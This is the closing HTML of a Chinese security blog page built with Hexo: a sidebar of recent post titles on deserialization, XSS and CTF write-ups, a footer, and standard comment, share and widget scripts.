            <a href="/2020/05/13/Apache-Common-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/">Apache Common Collections 反序列化分析学习</a>
          </li>
        
          <li>
            <a href="/2020/05/12/intigriti-Easter-XSS-challenge/">intigriti Easter XSS challenge</a>
          </li>
        
          <li>
            <a href="/2020/04/22/VolgaCTF-2020-Qualifier-Web/">VolgaCTF 2020 Qualifier-Web</a>
          </li>
        
          <li>
            <a href="/2020/04/15/DOM-Clobbering-Attack/">DOM Clobbering Attack</a>
          </li>
        
          <li>
            <a href="/2020/04/09/Javascript%E4%B8%AD%E5%8F%98%E9%87%8F%E5%A3%B0%E6%98%8E%E5%B8%A6%E6%9D%A5%E7%9A%84Tags-Broken/">Javascript中变量声明带来的Tags Broken</a>
          </li>
        
      </ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Links</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="http://arvinxiang.com" target="_blank">主题作者</a>
          </li>
        
          <li>
            <a href="http://reqianduan.com" target="_blank">热前端</a>
          </li>
        
          <li>
            <a href="http://yuancheng.work" target="_blank">远程.work</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
      
    </div>
    <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 离怀秋<br>
      Powered by <a href="//hexo.io/" target="_blank">Hexo</a>
      .
      Theme by <a href="https://github.com/xiangming/landscape-plus" target="_blank">Landscape-plus</a>
    </div>
  </div>
</footer>
  </div>
  <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
  <!-- totop start -->
<div id="totop">
<a title="totop"><img src="/img/scrollup.png"/></a>
</div>

<!-- totop end -->

<!-- 多说公共js代码 start -->
<script type="text/javascript">
var duoshuoQuery = {short_name:"reqianduan"};
  (function() {
    var ds = document.createElement('script');
    ds.type = 'text/javascript';ds.async = true;
    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
    ds.charset = 'UTF-8';
    (document.getElementsByTagName('head')[0]
     || document.getElementsByTagName('body')[0]).appendChild(ds);
  })();
  </script>
<!-- 多说公共js代码 end -->


<!-- 百度分享 start -->

<div id="article-share-box" class="article-share-box">
  <div id="bdshare" class="bdsharebuttonbox article-share-links">
    <a class="article-share-weibo" data-cmd="tsina" title="分享到新浪微博"></a>
    <a class="article-share-weixin" data-cmd="weixin" title="分享到微信"></a>
    <a class="article-share-qq" data-cmd="sqq" title="分享到QQ"></a>
    <a class="article-share-renren" data-cmd="renren" title="分享到人人网"></a>
    <a class="article-share-more" data-cmd="more" title="更多"></a>
  </div>
</div>
<script>
  function SetShareData(cmd, config) {
    if (shareDataTitle && shareDataUrl) {
      config.bdText = shareDataTitle;
      config.bdUrl = shareDataUrl;
    }
    return config;
  }
  window._bd_share_config={
    "common":{onBeforeClick: SetShareData},
    "share":{"bdCustomStyle":"/css/bdshare.css"}
  };
  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
</script>

<!-- 百度分享 end -->

<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>





<script src="/js/script.js"></script>


</div>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":200,"height":300},"mobile":{"show":false},"log":false});</script></body>
</html>
